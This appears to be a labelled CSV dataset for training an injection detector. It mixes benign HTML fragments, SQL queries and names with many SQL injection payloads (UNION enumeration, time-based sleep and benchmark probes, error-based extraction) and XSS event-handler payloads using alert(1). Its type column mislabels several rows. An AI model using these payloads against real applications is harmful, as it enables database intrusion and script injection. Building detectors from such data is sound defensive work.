Text,Label,type
"<a href=""#CITEREFHaugeland1985"">Haugeland 1985 </a>, pp.&#160;112–117 ",0,xss
"<applet onmousemove=""alert(1)"">test</applet>",2,xss
" SELECT * FROM section ORDER BY wing, himself",0,xss
695,0,xss
"<li class=""toclevel-2 tocsection-74""><a href=""#History_of_AI""><span class=""tocnumber"">13.2 ",0,xss
"  SELECT MAKEDATE ( 2017, 3 ) ;",0,sql
-8641%' order by 1--,1,sql
"  SELECT Orders.sortrID, Employees.left, Employees.hurry FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID  =  Employees.postID ORDER BY Orders.taughtID",0,sql
s5bal850de,0,xss
SELECT * FROM thy FETCH FIRST 3 ROWS ONLY,0,xss
howe1,0,sql
abdel-az,0,sql
SELECT * FROM  ( SELECT former FROM saw ) ,0,sql
<hgroup id=x tabindex=1 onactivate=alert(1)></hgroup>,2,xss
" select * from users where id  =  '1' + @<@# union select 1,version  (    )   -- 1'",1,sql
2.23935E+15,0,sql
1'||  (  select 'wszt' from dual where 6854  =  6854 and 6969  =    (  select 6969 from pg_sleep  (  5   )    )     )  ||',1,sql
"<input draggable=""true"" ondragenter=""alert(1)"">test</input>",2,xss
-3988'   )    )    union all select 1113#,1,sql
27915,0,sql
"1   )    )     )   union all select null,null,null,null,null,null,null,null,null,null--",1,sql
"  SELECT * FROM club WHERE cabin IN  ( 'chart', 'thread', 'carried' )  ",0,xss
" SELECT column_name ( s )  FROM sometime,paper",0,xss
elido,0,sql
56597686e,0,sql
zlotnick,0,sql
"	 </span><a href=""/w/index.php?title=Artificial_intelligence&amp;action=edit&amp;section=50"" title=""Edit section: Potential harm"">edit </a><span class=""mw-editsection-bracket"">] ",0,xss
"  SELECT REPLACE ( ""XYZ FGH XYZ"", ""X"", ""M"" ) ;",0,xss
SELECT * FROM cold WHERE ask BETWEEN 'wolf' AND 'numeral',0,sql
"1' in boolean mode  )   or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  #",1,sql
"<li id=""cite_note-56""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-56"">^ </a> </b> ",0,xss
"  SELECT fastened,fall FROM wash WHERE enter = 'play' UNION SELECT seven, block FROM certainly",0,sql
"<video autoplay controls onvolumechange=alert(1)><source src=""validvideo.mp4"" type=""video/mp4""></video>",2,xss
"<li><a href=""#CITEREFLugerStubblefield2004"">Luger &amp; Stubblefield 2004 </a>, pp.&#160;79–164, 193–219 </li>",0,xss
"-7845' union all select 9574,9574,9574,9574,9574,9574#",1,sql
aguazo,0,sql
-8359  )   where 4430  =  4430 or 6872  =  6872--,1,sql
"<p class=""mw-empty-elt"">",0,xss
"1"" where 9792  =  9792 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #",1,xss
<svg><summary onload=alert(1)></summary>,2,xss
"<div draggable=""true"" contenteditable>drag me</div><main ondragover=alert(1) contenteditable>drop here</main>",2,xss
SELECT AVG ( greater ) FROM honor,0,sql
SELECT * FROM worse WHERE herself = 'although'  AND City = 'farm',0,sql
geli febo,0,sql
"<style onmouseup=""alert(1)"">test</style>",2,xss
thomasin,0,sql
<thead onpointerenter=alert(1)>XSS</thead>,2,xss
SELECT * FROM yourself  WHERE planet = buy,0,sql
or 'text' > 't',1,sql
SELECT chart FROM empty,0,sql
"<big draggable=""true"" ondragstart=""alert(1)"">test</big>",2,xss
"1 and elt  (  1210  =  1210,sleep  (  5   )    )   ",1,sql
6260,0,sql
"1'  )   or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and   (  'thce'  =  'thce",1,sql
SELECT * FROM plus WHERE several NOT LIKE 'mother%',0,sql
"call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and   (  8503  =  8503",1,sql
<discard onpointerover=alert(1)>XSS</discard>,2,xss
vadim,0,xss
horalek,0,sql
"1%'  )   union all select null,null--",1,xss
46824,0,sql
dinelli@alcantarapartners.mt,0,sql
"1' where 2391  =  2391 union all select null,null,null,null,null,null,null,null,null,null--",1,sql
"-9462""  )   as vzga where 4799  =  4799 or 8691  =  1048",1,sql
"1' and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and 'egye'  =  'egye",1,sql
select   (  case when   (  9732  =  7136  )   then 9732 else 9732*  (  select 9732 from information_schema.character_sets  )   end  )  #,1,sql
"1'   )    )    as omwk where 1414  =  1414 and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )  --",1,sql
<noscript id=x tabindex=1 onfocusin=alert(1)></noscript>,2,xss
"<dt><a class=""reference internal"" href=""topics/autothrottle.html""><span class=""doc"">AutoThrottle extension",0,xss
	 </span>,0,xss
"1""  )   as nfpe where 2679  =  2679",1,sql
SELECT seldom ( s ) FROM anywhere INNER JOIN,0,sql
"<sub onbeforecut=""alert(1)"" contenteditable>test</sub>",2,xss
"	 </span></a></dt><dd>Quickly export your scraped items to a file (XML, CSV, etc).</dd>",0,xss
"   SELECT speech, somewhere, forget FROM putting WHERE on  IS NULL",0,sql
"<a href=""/wiki/Machine_perception"" title=""Machine perception"">Machine perception </a>:",0,xss
"-5125 union all select 5720,5720,5720,5720,5720,5720,5720,5720--",1,sql
<del id=x tabindex=1 ondeactivate=alert(1)></del><input id=y autofocus>,2,xss
"1'  )   where 6772  =  6772 and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )  --",1,sql
gumersindo,0,sql
"1"" and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and ""vziz""  =  ""vziz",1,sql
SELECT COUNT ( jarID ) FROM teeth,0,sql
"  SELECT Orders.hairrID, Employees.farther, Employees.organization FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID  =  Employees.vaporID ORDER BY Orders.horseID",0,sql
farid,0,sql
zemanek,0,sql
"-9398' union all select 3998,3998,3998,3998,3998,3998,3998,3998,3998#",1,xss
"1""   )    )     )   or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and    (    (     (  ""ijag""  =  ""ijag",1,sql
"<style>@keyframes slidein {}</style><tr style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></tr>",2,xss
<noembed onpointerout=alert(1)>XSS</noembed>,2,xss
"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3 and    (    (     (  'jutx'  =  'jutx",1,sql
select   (  case when   (  5740  =  7636  )   then 5740 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,1,sql
"<a href=""/wiki/Kernel_methods"" class=""mw-redirect"" title=""Kernel methods"">kernel methods </a> such as the <a href=""/wiki/Support_vector_machine"" class=""mw-redirect"" title=""Support vector machine"">support vector machine </a> (SVM),<sup id=""cite_ref-224"" class=""reference""><a href=""#cite_note-224"">&#91;h&#93; </a> </sup><sup id=""cite_ref-Kernel_methods_225-0"" class=""reference""><a href=""#cite_note-Kernel_methods-225"">&#91;217&#93; </a> </sup>",0,xss
SELECT * FROM higher ORDER BY make DESC,0,sql
"<li class=""toclevel-3 tocsection-63""><a href=""#Strong_AI_hypothesis""><span class=""tocnumber"">8.4.3 ",0,xss
1'   )    )    and sleep  (  5  )   and    (    (   'jiio' like 'jiio,1,xss
SELECT * FROM needs  WHERE dangerous NOT LIKE '[occasionally]%',0,sql
"-4993"" union all select 6959,6959,6959--",1,sql
SELECT * FROM bite WHERE dish NOT LIKE '[policeman]%',0,sql
SELECT COUNT ( wrong ) FROM work,0,sql
-4389'   )    )     )   or   (  1139  =  3499  )  *3499 and    (    (     (  'qoch'  =  'qoch,1,sql
"<textarea draggable=""true"" ondragend=""alert(1)"">test</textarea>",2,xss
"1""   )    )     )   or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (     (  ""wvyb""  =  ""wvyb",1,xss
"call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and 'tmdj' like 'tmdj",1,sql
"INSERT INTO saw ( knowledge, at, manufacturing, stream, me, melted )  VALUES  ( 'century', 'salmon'. old', 'move', 'line', 'open', 'wood' )  ",0,sql
"  SELECT Orders.primitiverID, Employees.fair, Employees.brief FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID  =  Employees.identityID ORDER BY Orders.neighborhoodID",0,sql
"  SELECT MONTH ( ""2017-06-15"" ) ;",0,sql
SELECT * FROM he WHERE jungle BETWEEN 'cup' AND 'could',0,sql
"	 </span><link rel=""mw-deduplicated-inline-style"" href=""mw-data:TemplateStyles:r935243608""/> </li>",0,xss
lurlene,0,sql
vilanova de segri,0,sql
SELECT option_value FROM wp_options WHERE option_name  =  '_transient_timeout_houzez_verification_success' LIMIT 1,0,sql
"select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and    (    (     (  'juhi' like 'juhi",1,sql
"	 	<a href=""#cite_note-The_Economist-135"">&#91;132&#93; </a> </sup>",0,xss
1'+  (  select aqhj where 4419  =  4419,1,xss
<rt id=x tabindex=1 onactivate=alert(1)></rt>,2,xss
"1%' and elt  (  1210  =  1210,sleep  (  5   )    )    and '%'  =  '",1,sql
vin,0,sql
DELETE FROM thought WHERE black = 'declared',0,sql
"1"" or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",1,xss
"<dt><a class=""reference internal"" href=""topics/debug.html""><span class=""doc"">Debugging Spiders",0,xss
SELECT * FROM combine WHERE happen BETWEEN '1996-07-01' AND '1996-07-31',0,sql
SELECT heart ( s ) FROM full INNER JOIN,0,sql
"select sleep  (  5  )   and    (    (     (  ""lczw""  =  ""lczw",1,sql
      v: latest,0,xss
avellano,0,sql
"<li><a href=""#CITEREFNilsson1998"">Nilsson 1998 </a>, chpt. 7–12 </li> </ul>",0,xss
"<figcaption onkeypress=""alert(1)"" contenteditable>test</figcaption>",2,xss
jackelyn,0,xss
"<li><a href=""#CITEREFNilsson1998"">Nilsson 1998 </a>, chpt. 3.3, 10.3, 17.5, 20 </li> </ul>",0,xss
"<hgroup draggable=""true"" ondragenter=""alert(1)"">test</hgroup>",2,xss
lilien@aprendeaestudiar.lt,0,xss
"select * from generate_series  (  9167,9167,case when   (  9167  =  2273  )   then 1 else 0 end  )   limit 1--",1,sql
"<li><a href=""#CITEREFNilsson1998"">Nilsson 1998 </a>, chpt. 18.2 </li> </ul>",0,xss
" union   (  select NULL, NULL, NULL, NULL,  NULL,   (  select @@version   )    )    --",1,xss
"SELECT INSTR ( ""W3Schools.com"", ""COM"" )  AS MatchPosition;",0,sql
"<li><a href=""#CITEREFCrevier1993"">Crevier 1993 </a>, pp.&#160;51, 64–65 </li>",0,xss
"<ul><li><a href=""#CITEREFRussellNorvig2003"">Russell &amp; Norvig 2003 </a>, pp.&#160;430–449 </li> </ul>",0,xss
<link rel=stylesheet href=1 onerror=alert(1)>,2,xss
"doctor ramon sanchez-parra, 17 11?d",0,sql
"<IMG SRC=# onmouseover=""alert('xxs')"">",2,xss
<strike id=x tabindex=1 onfocus=alert(1)></strike>,2,xss
"-6581'||  (  select 'hpjd' where 7608  =  7608 union all select 7608,7608,7608,7608,7608,7608,7608,7608#",1,sql
"<i onmousedown=""alert(1)"">test</i>",2,xss
" </div> </td> </tr><tr><th scope=""row"" class=""navbox-group"" style=""width:1%"">Concepts </th><td class=""navbox-list navbox-even"" style=""text-align:left;border-left-width:2px;border-left-style:solid;width:100%;padding:0px"">",0,xss
SELECT TOP 3 * FROM heavy SELECT * FROM hide 3SELECT * FROM are,0,sql
"<li><cite id=""CITEREFLangley2011"" class=""citation journal"">Langley, Pat (2011). ""The changing science of machine learning"". <i><a href=""/wiki/Machine_Learning_(journal)"" title=""Machine Learning (journal)"">Machine Learning </a> </i>. <b>82 </b> (3): 275–279. <a href=""/wiki/Digital_object_identifier"" title=""Digital object identifier"">doi </a>:<a rel=""nofollow"" class=""external text"" href=""https://doi.org/10.1007%2Fs10994-011-5242-y"">10.1007/s10994-011-5242-y </a>. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=article&amp;rft.jtitle=Machine+Learning&amp;rft.atitle=The+changing+science+of+machine+learning&amp;rft.volume=82&amp;rft.issue=3&amp;rft.pages=275-279&amp;rft.date=2011&amp;rft_id=info%3Adoi%2F10.1007%2Fs10994-011-5242-y&amp;rft.aulast=Langley&amp;rft.aufirst=Pat&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",0,xss
"select * from generate_series  (  2673,2673,case when   (  2673  =  1468  )   then 1 else 0 end  )   limit 1--",1,sql
SELECT COUNT ( write ) FROM poet,0,sql
7o14c0o,0,sql
"1 where 1153  =  1153 or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )   --",1,sql
birney-warbeck@lamejorplaya.gl,0,sql
"-9434""  )   as cqlw where 1600  =  1600 or 2733  =  1047--",1,sql
SELECT COUNT ( occur )  FROM trap,0,xss
8.27055E+15,0,sql
"-2860""   )    )    order by 1#",1,sql
"          <i data-toggle=""wy-nav-top"" class=""fa fa-bars""></i>",0,xss
select   (  case when   (  3539  =  8768  )   then 3539 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,1,sql
"1%""   )    )    and make_set  (  9897  =  5557,5557  )   and    (    (   ""%""  =  """,1,sql
"<li><a href=""/wiki/Bill_Hibbard"" title=""Bill Hibbard"">Bill Hibbard </a> </li>",0,xss
SELECT * FROM came WHERE green = 'quickly'  OR matter = 'deal',0,xss
" SELECT * FROM tales ORDER BY how ASC, break DESC",0,sql
"<time draggable=""true"" ondragstart=""alert(1)"">test</time>",2,xss
"calle sobrerroca 96, 7?f",0,sql
"<button onmouseover=""alert(1)"">test</button>",2,xss
SELECT * FROM stuck WHERE gravity  BETWEEN 10 AND 20,0,sql
	 </span>,0,xss
8.04589E+15,0,sql
26774865j,0,sql
"1%"" or elt  (  6272  =  6272,sleep  (  5   )    )    and ""%""  =  """,1,sql
"-6170   )    )     )   or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",1,xss
"1'  )   where 8211  =  8211 union all select null,null,null,null,null#",1,sql
"-1076 union all select 3959,3959--",1,sql
1' in boolean mode  )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )  #,1,xss
"1,  (  select   (  case when   (  5433  =  5433  )   then 1 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual  )  ",1,sql
1 and 7533  =  7533-- spzi,1,xss
"1%""   )    )    or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and    (    (   ""%""  =  """,1,sql
-4892%'   )    )    or 2251  =  9881--,1,sql
SELECT probably ( s )  FROM income FULL OUTER JOIN,0,xss
"1%'   )    )     )   and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and    (    (     (  '%'  =  '",1,sql
	 </span> </li>,0,xss
"-3393""   )    )    union all select 5954,5954,5954,5954,5954,5954,5954,5954,5954,5954--",1,sql
" SELECT column_name ( s )  FROM meal,happened",0,sql
"1"" where 6686  =  6686 or elt  (  6272  =  6272,sleep  (  5   )    )   --",1,sql
"<footer onbeforecopy=""alert(1)"" contenteditable>test</footer>",2,xss
"1 where 8390  =  8390 and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )   --",1,sql
SELECT TOP 50 PERCENT * FROM atom,0,sql
SELECT * FROM noise WHERE gray BETWEEN '1996-07-01' AND '1996-07-31',0,sql
" select * from users where id  =  '1' or !<1 union select 1,version  (    )   -- 1'",1,sql
"1%"" procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #",1,sql
<th id=x tabindex=1 onfocus=alert(1)></th>,2,xss
"   SELECT promised, additional, learn FROM value WHERE order  IS NULL",0,sql
"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and 'bzxo' like 'bzxo",1,sql
"<mark draggable=""true"" ondragenter=""alert(1)"">test</mark>",2,xss
<footer id=x tabindex=1 onfocus=alert(1)></footer>,2,xss
"  SELECT Orders.allowrID, Employees.increase, Employees.star FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID  =  Employees.lackID ORDER BY Orders.animalID",0,sql
1'   )    )    and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and    (    (   'glfq' like 'glfq,1,sql
1'  )   and 2305  =  1934,1,sql
SELECT * FROM straw WHERE shore NOT BETWEEN 'meat' AND 'port',0,sql
" </div> </td> </tr><tr><th scope=""row"" class=""navbox-group"" style=""width:1%"">Software organization </th><td class=""navbox-list navbox-even"" style=""text-align:left;border-left-width:2px;border-left-style:solid;width:100%;padding:0px"">",0,xss
"-7001'+  (  select slav where 9321  =  9321 union all select 9321,9321,9321,9321,9321,9321,9321,9321,9321--",1,sql
1'||  (  select 'pcps' from dual where 7255  =  7255 and 7121  =  4603,1,xss
" select * from users where id  =  '1' union select $[""],@@VERSION -- 1'",1,xss
"<ul><li><a href=""/wiki/Interaction_design"" title=""Interaction design"">Interaction design </a> </li>",0,xss
techumbre,0,sql
"1""  )   where 3727  =  3727 and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --",1,sql
"<ul><li><a href=""#CITEREFMcCorduck2004"">McCorduck 2004 </a>, pp.&#160;243–252 </li>",0,xss
55964057c,0,sql
"  SELECT Orders.collectrID, Employees.current, Employees.kind FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID  =  Employees.settingID ORDER BY Orders.fourID",0,sql
SELECT * FROM nearly WHERE    NOT find = 'add',0,sql
850il1ta045n,0,sql
"	 </span><span class=""mw-editsection""><span class=""mw-editsection-bracket"">[ ",0,xss
SELECT COUNT ( modern ) FROM double,0,sql
<svg><rtc onload=alert(1)></rtc>,2,xss
SELECT shape FROM kill,0,sql
if  (  2695  =  9045  )   select 2695 else drop function qmno--,1,sql
SELECT LOG10 ( 4.5 ) ;,0,sql
<acronym id=x tabindex=1 onbeforeactivate=alert(1)></acronym>,2,xss
	 </span>,0,xss
"1'  )   where 6388  =  6388 or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",1,sql
"        <script src=""_static/doctools.js""></script>",0,xss
